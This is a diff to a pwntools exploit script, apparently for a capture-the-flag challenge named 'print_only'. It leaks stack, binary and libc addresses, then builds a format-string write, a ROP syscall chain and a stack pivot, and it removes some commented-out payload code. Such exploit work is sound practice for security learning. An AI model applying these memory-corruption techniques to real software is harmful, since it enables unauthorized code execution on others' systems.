@@ -5,7 +5,7 @@
 from pwn import *
 
 # Set up pwntools for the correct architecture
-exe = context.binary = ELF('./print_only')
+exe = context.binary = ELF('./print_only_patched')
 
 # Many built-in settings can be controlled on the command-line and show up
 # in "args".  For example, to dump all data sent/received, and disable ASLR
@@ -66,16 +66,9 @@ c
 io = start()
 
 def send(p):
-    # p = p.ljust(0x128,"a")
     io.send(p)
 
-if args.LOCAL :
-    libc = exe.libc
-else:
-    libc = ELF("./libc.so.6")
-    # libc = ELF("./libc6_2.31-0ubuntu9.1_amd64.so")
-    # libc = ELF("./libc6_2.31-0ubuntu9.2_amd64.so")
-    # libc = ELF("./libc6_2.31-0ubuntu9_amd64.so")
+libc = exe.libc
 
 def syscall(rax, rdi, rsi, rdx):
     chain = p64(pop_rax) + p64(rax)
@@ -92,10 +85,9 @@ print (leak)
 stack = int(leak[0],16)
 base_exe = int(leak[1],16)- 0x138a
 
-if args.LOCAL :
-    libc.address = int(leak[2],16) - libc.sym["__libc_start_main"] - 234
-else:
-    libc.address = int(leak[2],16) - libc.sym["__libc_start_main"] - 234 - 9
+
+libc.address = int(leak[2],16) - libc.sym["__libc_start_main"] - 234 - 9
+
 
 
 pop_rax = libc.search(asm('pop rax ; ret')).next()
@@ -126,38 +118,7 @@ pop_r8 = libc.address + 0x000000000012a8b6
 print hex(base_exe)
 print hex(libc.address)
 
-
 len_format = 0xffff
-
-# sys = stack - 8 + 0x50 # + 24
-# offset = []
-#
-# for i in range(2):
-#    tmp = sys & len_format
-#    offset.append(tmp)
-#    sys >>= len_format.bit_length() # bit
-#
-# sys = base_exe + 0x136c
-#
-# for i in range(2):
-#    tmp = sys & len_format
-#    offset.append(tmp)
-#    sys >>= len_format.bit_length()
-
-# hhn 1 bytes 8 bit
-# hn 2 bytes 16 bit
-# n 4 bytes 32 bit
-
-# p = '%{}x%12$hhn'.format(offset[0])
-# p += '%{}x%13$hhn'.format(offset[1] - offset[0] + len_format + 1)
-# p += '%{}x%14$hhn'.format(offset[2] - offset[1] + len_format + 1)
-# p += '%{}x%15$hhn'.format(offset[3] - offset[2] + len_format + 1)
-# # p = '%12$p'
-# p = p.ljust(72-24, '\x00')
-# p += p64(stack_rbp) # tujuan
-# p += p64(stack_rbp+1)
-# p += p64(stack_rbp+8) # tujuan
-# p += p64(stack_rbp+9)
 
 sys = stack - 8 + 8*6 # + 24
 offset = []
@@ -184,9 +145,6 @@ p += syscall(0, 0, bss+0x100, 320)
 p += p64(pop_rbp)
 p += p64(bss+0x100+8+24)
 p += p64(leave)
-
-
-# p += p64(base_exe + 0x1310)
 
 print (len (p))
 assert len(p) <= 0x128 # 298
